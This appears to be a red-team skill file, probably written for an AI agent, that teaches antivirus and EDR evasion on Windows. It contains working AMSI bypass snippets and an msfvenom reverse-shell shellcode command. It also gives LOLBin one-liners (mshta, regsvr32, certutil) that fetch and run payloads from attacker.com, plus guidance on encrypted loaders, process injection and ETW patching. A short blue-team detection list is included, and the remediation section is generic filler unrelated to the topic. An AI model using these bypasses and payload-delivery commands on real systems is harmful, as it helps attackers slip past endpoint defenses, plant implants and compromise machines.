---
name: av-edr-evasion-techniques
description: >
  Bypass antivirus and Endpoint Detection & Response solutions during red team operations using
  payload obfuscation, process injection, AMSI bypass, ETW patching, and custom loaders. Use this
  skill when AV/EDR is blocking your payloads, tooling, or post-exploitation activities. Covers
  shellcode encryption, syscall-based injection, unhooking techniques, and living-off-the-land
  approaches for opsec-safe red team operations.
domain: cybersecurity
subdomain: red-teaming
category: Evasion
difficulty: expert
estimated_time: "4-8 hours"
mitre_attack:
  tactics: [TA0005]
  techniques: [T1027, T1562.001, T1055, T1218]
platforms: [windows]
tags: [av-evasion, edr-bypass, amsi-bypass, shellcode-obfuscation, process-injection, red-team, evasion, opsec]
tools: [scarecrow, nimcrypt2, donut, syscallwhispers, sharpblock]
version: "1.0"
author: CyberSkills-Elite
license: Apache-2.0
---

# AV/EDR Evasion Techniques

## When to Use
- When AV/EDR blocks your payloads during red team operations
- When you need to execute tools on endpoints with active security monitoring
- When testing an organization's endpoint detection capabilities
- When developing custom loaders for C2 implants

**⚠️ WARNING**: Only use on authorized engagements. EDR evasion without authorization is illegal.


## Prerequisites
- Active engagement with a defended target environment (EDR/AV present)
- Understanding of the target's security stack (Defender, CrowdStrike, Carbon Black, etc.)
- Payload development framework (msfvenom, Cobalt Strike, custom tooling)
- Test environment matching the target OS/EDR for pre-engagement validation

## Workflow

### Phase 1: Target EDR Identification

```powershell
# Identify installed security products
Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntiVirusProduct | Select displayName
wmic /namespace:\\root\SecurityCenter2 path AntiVirusProduct get displayName

# Process-based detection
tasklist | findstr -i "MsMpEng CrowdStrike CSFalcon SentinelOne cylance cbdefense xagt"

# Modern EDR enumeration:
# CrowdStrike Falcon → CSFalconService, CSFalconContainer
# SentinelOne → SentinelAgent, SentinelStaticEngine
# Microsoft Defender for Endpoint → MsSense
# Carbon Black → CbDefense, RepMgr
# Cortex XDR → CryptSvc associated with Palo Alto
# Elastic EDR → elastic-agent, elastic-endpoint

# Check if Windows Defender is enabled
Get-MpComputerStatus | Select AntivirusEnabled, RealTimeProtectionEnabled
```

### Phase 2: AMSI Bypass (PowerShell Context)

```powershell
# AMSI (Antimalware Scan Interface) scans PowerShell, VBA, JScript, etc.

# Method 1: Memory patching (patch AmsiScanBuffer)
$a=[Ref].Assembly.GetType('System.Management.Automation.Am'+'siUtils')
$b=$a.GetField('am'+'siInitFailed','NonPublic,Static')
$b.SetValue($null,$true)

# Method 2: Context corruption
$mem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(9076)
[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiContext","NonPublic,Static").SetValue($null,[IntPtr]$mem)

# Method 3: String obfuscation of bypass
# Encode and decode at runtime to avoid static detection
$e = [System.Convert]::FromBase64String("BASE64_ENCODED_BYPASS")
$decoded = [System.Text.Encoding]::UTF8.GetString($e)
Invoke-Expression $decoded

# Method 4: Reflection-based (current at time of writing)
# These change frequently — always test before engagement

# Verify AMSI is bypassed:
# Try: Invoke-Mimikatz (should not trigger AMSI if bypassed)
```

### Phase 3: Shellcode Encryption & Custom Loaders

```csharp
// Concept: AES-encrypt shellcode, decrypt at runtime, inject into memory
// This avoids static pattern matching by AV

// Step 1: Generate raw shellcode from C2
// msfvenom -p windows/x64/meterpreter/reverse_https LHOST=IP LPORT=PORT -f raw > shell.bin
// Or export from Cobalt Strike as raw shellcode

// Step 2: Encrypt shellcode with AES-256
// python3 encrypt_shellcode.py shell.bin > encrypted.bin

// Step 3: Custom C# loader (conceptual structure):
// - Embed encrypted shellcode as resource
// - AES decrypt at runtime
// - Allocate executable memory (VirtualAlloc)
// - Copy decrypted shellcode to memory
// - Execute via CreateThread or callback

// Key evasion techniques in loader:
// - Sandbox detection (sleep, user interaction checks)
// - API call unhooking (direct syscalls)
// - Process injection instead of self-execution
// - Signed binary sideloading
```

### Phase 4: Process Injection Techniques

```
// Common injection methods (from stealthiest to noisiest):

// 1. Early Bird APC Injection (very stealthy)
//    Create suspended process → Queue APC → Resume
//    Executes before EDR hooks are set up

// 2. Module Stomping / DLL Hollowing
//    Load legitimate DLL → Overwrite .text section with shellcode
//    Appears as legitimate module in memory

// 3. Thread Hijacking
//    Suspend existing thread → Modify context → Resume
//    No new thread creation (avoids CreateRemoteThread detection)

// 4. Process Hollowing
//    Create suspended process → Unmap → Map shellcode → Resume
//    Classic but well-detected by modern EDR

// 5. DLL Injection (CreateRemoteThread)
//    Load malicious DLL into target process
//    Most detected, use only as last resort

// Choose injection target wisely:
// GOOD: svchost.exe, RuntimeBroker.exe, explorer.exe (blend in)
// BAD: notepad.exe making network connections (suspicious)
```

### Phase 5: ETW Patching (Disable Telemetry)

```powershell
# ETW (Event Tracing for Windows) feeds data to EDR
# Patching ETW stops telemetry at the source

# Concept: Patch EtwEventWrite in ntdll.dll to return immediately
# This prevents .NET CLR events, process creation events, etc.
# from being sent to EDR

# Note: Implementation details intentionally abbreviated
# Full implementation requires understanding of:
# - ntdll.dll memory layout
# - x64 function patching
# - Thread safety considerations

# Alternative: Use direct syscalls to avoid ntdll hooks entirely
# Tools: SyscallWhispers, HellsGate, Syswhispers2/3
```

### Phase 6: Living off the Land (LOLBins)

```powershell
# Execute payloads using legitimate Windows binaries
# These bypass application whitelisting and raise fewer alerts

# Execution:
# mshta — Execute HTA files
mshta http://attacker.com/payload.hta
mshta "javascript:a=GetObject('script:http://attacker.com/payload.sct')"

# rundll32 — Execute DLL functions
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";document.write();

# regsvr32 — Execute scriptlet files
regsvr32 /s /n /u /i:http://attacker.com/payload.sct scrobj.dll

# certutil — Download files
certutil -urlcache -split -f http://attacker.com/payload.exe C:\temp\payload.exe

# msbuild — Execute inline C# code from XML
msbuild.exe malicious.csproj

# installutil — Load .NET assembly
InstallUtil.exe /logfile= /LogToConsole=false /U malicious.dll

# Reference: https://lolbas-project.github.io/
```

## 🔵 Blue Team Detection
- **Behavioral detection**: Focus on behaviors (process injection, AMSI patching) not signatures
- **Memory scanning**: Scan process memory for known implant patterns
- **ETW monitoring**: Monitor for ETW patching attempts
- **AMSI logging**: Alert on AMSI bypass indicators
- **Syscall monitoring**: Detect direct syscalls bypassing ntdll hooks
- **LOLBin monitoring**: Alert on suspicious use of legitimate binaries

## Key Concepts
| Concept | Description |
|---------|-------------|
| AMSI | Windows' Antimalware Scan Interface for script-based attacks |
| ETW | Event Tracing for Windows — telemetry pipeline EDR relies on |
| Process injection | Executing code in another process's memory space |
| Syscalls | Calling kernel functions directly, bypassing user-mode hooks |
| LOLBins | Legitimate binaries abused for malicious purposes |
| Shellcode loader | Custom program that decrypts and executes shellcode in memory |
| Module stomping | Overwriting a legitimate DLL's code section with shellcode |

## Output Format
```
AV/EDR Evasion Assessment Report
==================================
Target EDR: CrowdStrike Falcon (v6.x)
Evasion Achieved: YES (full bypass)

Techniques Used:
1. AMSI patched successfully (PowerShell execution unblocked)
2. ETW patched (telemetry disabled)
3. Custom AES-encrypted shellcode loader → Beacon deployed
4. Process injection via Early Bird APC into svchost.exe
5. C2 communication via HTTPS mimicking Microsoft Teams traffic

Detection Gaps:
- No alert generated for AMSI bypass
- Process injection not detected (Early Bird technique)
- Custom loader passed static and behavioral analysis
- Network traffic blended with legitimate Teams traffic

Recommendations:
1. Enable kernel-level ETW protection
2. Implement AMSI provider hardening
3. Deploy memory scanning for known implant patterns
4. Monitor for suspicious parent-child process relationships
```

## 🛡️ Remediation & Mitigation Strategy
- **Input Validation:** Sanitize and strictly type-check all inputs.
- **Least Privilege:** Constrain component execution bounds.


## 📚 Shared Resources
> For cross-cutting methodology applicable to all vulnerability classes, see:
> - [`_shared/references/elite-chaining-strategy.md`](../_shared/references/elite-chaining-strategy.md) — Exploit chaining methodology and high-payout chain patterns
> - [`_shared/references/elite-report-writing.md`](../_shared/references/elite-report-writing.md) — HackerOne-optimized report writing, CWE quick reference
> - [`_shared/references/real-world-bounties.md`](../_shared/references/real-world-bounties.md) — Verified disclosed bounties by vulnerability class

## References
- LOLBAS Project: [Living Off The Land Binaries](https://lolbas-project.github.io/)
- MITRE ATT&CK: [T1027 — Obfuscated Files](https://attack.mitre.org/techniques/T1027/)
- Elastic: [Evasion Techniques](https://elastic.github.io/security-research/)
- Red Team Notes: [AV Evasion](https://www.ired.team/offensive-security/code-injection-process-injection)
